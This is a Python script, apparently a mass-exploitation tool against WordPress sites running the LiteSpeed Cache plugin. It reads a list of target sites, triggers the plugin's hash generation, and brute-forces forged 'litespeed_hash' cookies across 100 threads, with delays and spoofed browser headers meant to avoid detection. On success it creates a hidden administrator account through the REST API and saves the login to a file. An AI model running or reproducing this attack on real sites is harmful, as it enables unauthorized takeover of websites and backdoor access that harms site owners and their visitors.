import requests
import random
import string
import time
import concurrent.futures

# Configuration
num_workers = 100  # Increased site scanning threads to 100
request_delay = 3  # Adjusted to 3 seconds to prevent detection
num_hash_attempts = 100  # Increased hash attempts per site thread to 100
new_username = 'newadminuser'  # Replace with desired username
new_user_password = 'NewAdminPassword123!'  # Replace with a secure password

# User-Agent headers (to mimic real browser traffic)
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def mt_srand(seed=None):
    """ Mimics PHP's mt_srand function by setting the seed for random number generation. """
    random.seed(seed)

def mt_rand(min_value=0, max_value=2**32 - 1):
    """ Mimics PHP's mt_rand function by generating a random number within the specified range. """
    return random.randint(min_value, max_value)

def generate_random_string(length=6):
    """ Generates a random string based on the output of mt_rand. """
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def trigger_hash_generation(target_url):
    """ Triggers LiteSpeed Cache hash generation via AJAX request. """
    ajax_endpoint = '/wp-admin/admin-ajax.php'
    payload = {'action': 'async_litespeed', 'litespeed_type': 'crawler'}
    try:
        response = requests.post(f'{target_url}{ajax_endpoint}', data=payload, headers=headers)
        if response.status_code == 200:
            print(f'[INFO] Triggered hash generation on {target_url}')
        else:
            print(f'[ERROR] Failed to trigger hash on {target_url} - Status: {response.status_code}')
    except requests.RequestException as e:
        print(f'[ERROR] AJAX request failed on {target_url}: {e}')
    time.sleep(request_delay)  # Delay after triggering hash

def attempt_hash(target_url, hash_value):
    """ Attempts to use a generated hash for admin access. """
    cookies = {
        'litespeed_hash': hash_value,
        'litespeed_role': '1'  # Assuming admin user ID is '1'
    }
    try:
        response = requests.post(f'{target_url}/wp-json/wp/v2/users', cookies=cookies, headers=headers)
        return response, cookies
    except requests.RequestException as e:
        print(f'[ERROR] Request failed on {target_url}: {e}')
        return None, None

def create_admin_user(target_url, cookies):
    """ Creates a new WordPress administrator if a valid hash is found. """
    user_data = {
        'username': new_username,
        'password': new_user_password,
        'email': f'{new_username}@example.com',
        'roles': ['administrator']
    }
    try:
        response = requests.post(f'{target_url}/wp-json/wp/v2/users', cookies=cookies, json=user_data, headers=headers)
        if response.status_code == 201:
            print(f'[SUCCESS] New admin user "{new_username}" created on {target_url}')
            save_login(target_url, new_username, new_user_password)
        else:
            print(f'[ERROR] Failed to create admin user on {target_url} - Status: {response.status_code} - Response: {response.text}')
    except requests.RequestException as e:
        print(f'[ERROR] User creation request failed on {target_url}: {e}')

def save_login(target_url, username, password):
    """ Saves successful logins to a text file. """
    with open("login.txt", "a") as f:
        f.write(f"{target_url} | Username: {username} | Password: {password}\n")

def worker(target_url):
    """ Worker function to perform multiple hash attempts for a single target. """
    for _ in range(num_hash_attempts):
        random_string = generate_random_string()
        print(f'[DEBUG] Trying hash: {random_string} on {target_url}')

        response, cookies = attempt_hash(target_url, random_string)

        if response is None:
            continue

        print(f'[DEBUG] Response status code: {response.status_code}')
        print(f'[DEBUG] Response content: {response.text}')

        if response.status_code == 201:
            print(f'[SUCCESS] Valid hash found on {target_url}: {random_string}')
            create_admin_user(target_url, cookies)
            return
        elif response.status_code == 401:
            print(f'[FAIL] Invalid hash: {random_string}')
        else:
            print(f'[ERROR] Unexpected response for hash: {random_string} - Status: {response.status_code}')

        time.sleep(request_delay)  # Delay between hash attempts

def scan_target(target_url):
    """ Scans a single target site using multiple threads for hash attempts. """
    print(f'[INFO] Scanning {target_url}')
    trigger_hash_generation(target_url)

    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
        futures = [executor.submit(worker, target_url) for _ in range(num_workers)]
        concurrent.futures.wait(futures)

def main():
    """ Reads the list of target URLs and launches scans in parallel. """
    try:
        with open("listsite.txt", "r") as file:
            targets = [line.strip() for line in file if line.strip()]
        
        if not targets:
            print("[ERROR] No valid targets found in listsite.txt")
            return

        print(f"[INFO] Starting mass scan on {len(targets)} sites...")

        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
            executor.map(scan_target, targets)

    except FileNotFoundError:
        print("[ERROR] listsite.txt not found!")

if __name__ == '__main__':
    main()
